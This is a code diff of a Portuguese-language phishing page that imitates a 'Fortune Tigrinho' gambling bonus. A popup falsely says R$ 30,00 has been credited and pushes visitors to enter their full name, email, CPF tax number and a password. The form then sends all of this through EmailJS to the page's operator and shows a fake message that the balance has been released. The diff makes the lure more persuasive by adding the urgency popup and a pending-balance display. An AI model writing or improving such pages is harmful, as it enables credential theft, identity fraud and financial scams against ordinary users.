@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bônus Tigrinho - Ganhe R$ 30,00</title>
-    <!-- Importa a biblioteca do EmailJS -->
+    <title>Resgate Tigrinho - Bônus Liberado</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function(){
@@ -16,7 +15,7 @@
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
 
         body {
-            background: linear-gradient(135deg, #1a0b2e, #4a148c);
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             font-family: 'Poppins', sans-serif;
             display: flex;
             justify-content: center;
@@ -27,14 +26,14 @@
             overflow: hidden;
         }
 
-        /* Efeito de partículas de ouro no fundo */
+        /* Efeito de Partículas */
         .particle {
             position: absolute;
-            width: 5px;
-            height: 5px;
+            width: 6px;
+            height: 6px;
             background: gold;
             border-radius: 50%;
-            animation: float 5s infinite ease-in-out;
+            animation: float 4s infinite ease-in-out;
             opacity: 0.6;
         }
         @keyframes float {
@@ -43,11 +42,50 @@
             100% { transform: translateY(-100vh) scale(0); opacity: 0; }
         }
 
+        /* Modal de Aviso */
+        .modal {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            width: 280px;
+            color: #333;
+            border: 4px solid #ffd700;
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.6);
+            animation: popIn 0.5s ease;
+        }
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+        .modal h3 { color: #d32f2f; margin-top: 0; }
+        .btn-close-modal {
+            background: #00c853;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* Card Principal */
         .card {
             background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(15px);
+            backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 40px 30px;
+            padding: 30px;
             border-radius: 20px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.5);
             width: 320px;
@@ -57,155 +95,112 @@
         }
 
         .badge {
-            background: linear-gradient(45deg, #ff0000, #ff6600);
+            background: #ff0000;
             color: white;
-            padding: 5px 15px;
+            padding: 5px 12px;
             border-radius: 20px;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 800;
-            text-transform: uppercase;
             position: absolute;
-            top: -15px;
+            top: -12px;
             left: 50%;
             transform: translateX(-50%);
-            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.4);
+            box-shadow: 0 2px 10px rgba(255, 0, 0, 0.4);
         }
 
-        h2 {
-            margin: 10px 0 20px 0;
-            font-size: 24px;
-            color: #ffd700;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
-        }
+        h2 { margin: 10px 0 15px; font-size: 22px; color: #ffd700; text-shadow: 0 0 5px rgba(255,215,0,0.5); }
+        
+        .tiger-icon { font-size: 50px; animation: bounce 2s infinite; display: block; margin: 0 auto; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
 
-        .tiger-anim {
-            font-size: 60px;
-            animation: bounce 2s infinite;
-            display: block;
-            margin-bottom: 10px;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .bonus-text {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 10px;
-            border-radius: 10px;
+        .status-box {
+            background: rgba(0, 200, 83, 0.2);
+            border: 1px solid #00c853;
+            color: #00c853;
+            padding: 8px;
+            border-radius: 8px;
             margin-bottom: 20px;
-            border: 1px solid #ffd700;
-        }
-        .bonus-text strong {
-            color: #00ff00;
-            font-size: 18px;
+            font-size: 13px;
+            font-weight: 600;
         }
 
         input {
             width: 100%;
             padding: 12px;
-            margin-bottom: 15px;
-            border: none;
-            border-radius: 8px;
-            background: rgba(255, 255, 255, 0.9);
-            color: #333;
-            font-size: 14px;
+            margin-bottom: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            background: #f0f0f0;
+            font-size: 13px;
             box-sizing: border-box;
             transition: 0.3s;
         }
-
-        input:focus {
-            outline: none;
-            box-shadow: 0 0 10px #ffd700;
-            transform: scale(1.02);
-        }
+        input:focus { outline: none; border-color: #ffd700; background: #fff; box-shadow: 0 0 8px gold; }
 
         button {
             width: 100%;
-            padding: 15px;
+            padding: 14px;
             border: none;
             border-radius: 8px;
-            background: linear-gradient(45deg, #ffcc00, #ff9900);
+            background: linear-gradient(to bottom, #ffd700, #ff9900);
             color: #000;
             font-weight: 800;
-            font-size: 16px;
+            font-size: 15px;
             cursor: pointer;
-            transition: 0.3s;
-            position: relative;
-            overflow: hidden;
+            margin-top: 5px;
+            box-shadow: 0 4px 0 #cc7a00;
+            transition: 0.1s;
         }
+        button:active { transform: translateY(4px); box-shadow: none; }
 
-        button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 20px #ffcc00;
-        }
-
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-
-        .loader {
-            display: none;
-            width: 100%;
-            height: 4px;
-            background: #ddd;
-            margin-top: 10px;
-            border-radius: 2px;
-            overflow: hidden;
-        }
-        .loader-bar {
-            height: 100%;
-            width: 0%;
-            background: #00ff00;
-            transition: width 2s ease;
-        }
-
-        .footer {
-            margin-top: 15px;
-            font-size: 11px;
-            color: #aaa;
-        }
+        .loader-container { width: 100%; height: 4px; background: #ddd; margin-top: 10px; border-radius: 2px; overflow: hidden; display: none; }
+        .loader-bar { height: 100%; width: 0%; background: #00c853; transition: width 1.5s linear; }
     </style>
 </head>
 <body>
 
-    <!-- Partículas de fundo -->
+    <!-- Partículas de Fundo -->
     <div id="particles"></div>
 
+    <!-- Modal de Aviso -->
+    <div id="modalResgate" class="modal">
+        <div class="modal-content">
+            <h3>🎉 Bônus Resgatado!</h3>
+            <p style="margin: 10px 0;">Você ganhou <strong>R$ 30,00</strong> na conta!</p>
+            <p style="font-size: 12px; color: #666;">Complete o cadastro abaixo para liberar seu saque.</p>
+            <button class="btn-close-modal" onclick="document.getElementById('modalResgate').style.display='none'">Liberar Agora</button>
+        </div>
+    </div>
+
+    <!-- Card Principal -->
     <div class="card">
-        <div class="badge">OFERTA EXCLUSIVA</div>
-        <div class="tiger-anim">🐯</div>
-        <h2>Fortune Tiger</h2>
+        <div class="badge">OFERTA RELÂMPAGO</div>
+        <div class="tiger-icon">🐯</div>
+        <h2>Fortune Tigrinho</h2>
         
-        <div class="bonus-text">
-            Ganhe <strong>R$ 30,00</strong> grátis para apostar!
+        <div class="status-box">
+            Saldo: R$ 30,00 (Aguardando confirmação)
         </div>
 
         <form id="tigrinhoForm">
             <input type="text" name="name" placeholder="Nome Completo" required>
-            <input type="email" name="email" placeholder="Seu Melhor E-mail" required>
-            <input type="tel" name="cpf" placeholder="CPF (000.000.000-00)" required pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" title="Formato: 000.000.000-00">
-            <input type="password" name="password" placeholder="Crie uma Senha Forte" required>
+            <input type="email" name="email" placeholder="E-mail de Acesso" required>
+            <input type="tel" name="cpf" placeholder="CPF (000.000.000-00)" required>
+            <input type="password" name="password" placeholder="Crie sua Senha" required>
             
-            <button type="submit" id="btnSubmit">RESGATAR R$ 30,00</button>
+            <button type="submit" id="btnSubmit">CONFIRMAR E JOGAR</button>
             
-            <div class="loader">
+            <div class="loader-container" id="loaderCont">
                 <div class="loader-bar" id="loaderBar"></div>
             </div>
-            <p id="msg" style="font-size: 12px; margin-top: 10px; height: 15px;"></p>
+            <p id="msg" style="font-size: 11px; margin-top: 8px; height: 14px;"></p>
         </form>
     </div>
 
-    <div class="footer">
-        Plataforma segura e certificada © 2026
-    </div>
-
     <script>
-        // Gera partículas douradas
+        // Gerar partículas
         const particlesContainer = document.getElementById('particles');
-        for(let i=0; i<30; i++) {
+        for(let i=0; i<20; i++) {
             const p = document.createElement('div');
             p.classList.add('particle');
             p.style.left = Math.random() * 100 + 'vw';
@@ -217,7 +212,8 @@
         // Lógica do Formulário
         const form = document.getElementById('tigrinhoForm');
         const btn = document.getElementById('btnSubmit');
-        const loader = document.getElementById('loaderBar');
+        const loaderCont = document.getElementById('loaderCont');
+        const loaderBar = document.getElementById('loaderBar');
         const msg = document.getElementById('msg');
 
         form.addEventListener('submit', function(event) {
@@ -225,37 +221,30 @@
             
             btn.disabled = true;
             btn.innerText = "PROCESSANDO...";
-            loader.style.display = 'block';
+            loaderCont.style.display = 'block';
             
-            // Simula carregamento visual
-            setTimeout(() => {
-                loader.style.width = '100%';
-            }, 100);
+            setTimeout(() => { loaderBar.style.width = '100%'; }, 100);
 
-            // Configura EmailJS
             const serviceID = 'service_1tsipns'; 
             const templateID = 'template_38m07j9';
 
             emailjs.sendForm(serviceID, templateID, this)
                 .then(() => {
-                    loader.style.background = '#00ff00';
-                    msg.innerText = "Sucesso! Verifique seu e-mail.";
-                    msg.style.color = "#00ff00";
-                    btn.innerText = "CADASTRADO!";
+                    loaderBar.style.background = '#00c853';
+                    msg.innerText = "Saldo Liberado! Redirecionando...";
+                    msg.style.color = "#00c853";
+                    btn.innerText = "SUCESSO";
                     
-                    // Opcional: Redirecionar para a "loja" do jogo após 2 segundos
                     setTimeout(() => {
-                        // window.location.href = "link_do_seu_jogo_aqui.html";
-                        alert("Parabéns! Seu saldo de R$ 30,00 foi creditado. Redirecionando...");
+                        alert("Parabéns! R$ 30,00 creditados. Iniciando o jogo...");
+                        // window.location.href = "link_do_jogo.html"; 
                     }, 1500);
-
                 }, (err) => {
-                    loader.style.background = '#ff0000';
-                    msg.innerText = "Erro ao cadastrar. Tente novamente.";
+                    loaderBar.style.background = '#ff0000';
+                    msg.innerText = "Erro. Tente novamente.";
                     msg.style.color = "red";
                     btn.disabled = false;
-                    btn.innerText = "RESGATAR";
-                    console.log(JSON.stringify(err));
+                    btn.innerText = "TENTAR DE NOVO";
                 });
         });
     </script>
